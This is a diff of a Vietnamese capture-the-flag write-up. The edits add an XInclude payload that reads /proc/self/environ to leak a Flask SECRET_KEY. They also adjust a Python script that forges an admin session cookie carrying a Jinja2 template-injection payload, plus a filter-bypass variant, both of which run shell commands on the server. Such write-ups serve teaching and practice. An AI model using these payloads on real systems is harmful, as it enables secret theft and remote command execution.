@@ -140,6 +140,15 @@ def handle_message(xpath, xml):
 - Mình có thử payload sử dụng file `dtd` payload này không sài `&` nhưng không có request tới server của mình.
 
 ### Payload
+Payload read environ để lấy `SECRET_KEY`
+
+```xml
+<root>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="/proc/self/environ" parse="text" />
+</foo>
+</root>
+```
 File `payload.py`
 
 ```py
@@ -179,7 +188,7 @@ if len(sys.argv) < 2:
 URL = sys.argv[1]
 
 SECRET_KEY = '476345fdc597d6cb6dd68ae949b2694a'
-PAYLOAD = {u'is_admin':1,u'username':"""{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}
+PAYLOAD = {u'is_admin':1,u'username':"""{\%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""}
 
 def getSession():
 	cookie = encodeFlaskCookie(SECRET_KEY, PAYLOAD)
@@ -194,11 +203,11 @@ def getFlag():
 if __name__ == "__main__":
 	getFlag()
 ```
-Chạy file này với command `python3 payload.py http://34.124.209.122:1337/`. Nếu có source deploy trên local thì thay bằng url local
+Chạy file này với command `python3 payload.py http://34.124.209.122:1337`. Nếu có source deploy trên local thì thay bằng url local
 ![image](https://user-images.githubusercontent.com/54855855/141679163-21adcb12-0fbc-46f6-b811-a70fc86142d2.png)
 BONUS: Tối hôm đó mình solved, có vẻ như chall vẫn đang được patch bằng cách replace thêm 1 số kí tự như `["{{","/", "*", "'", '"', "o","r"]`. Vì vậy mình không thể solved bằng payload trên mà mình đã thay bằng:
 ```
-{{config.__class__.__init__.__globals__['os'].system('/?eadFlag > /tmp/taidh')}}
+{{config.__class__.__init__.__globals__['os'].system('/?eadflag > /tmp/taidh')}}
 ```
 Cuối cùng mình sử dụng `xml` lúc đầu để đọc `environ` để đọc flag bằng đường dẫn `/tmp/taidh`. Nhưng mình không hiểu tại sao vẫn có thể sài `"` `'` và `{{` bình thường mặc dù nó nằm trong `blacklist`. Chỉ có mỗi `r` bị replace :D
 
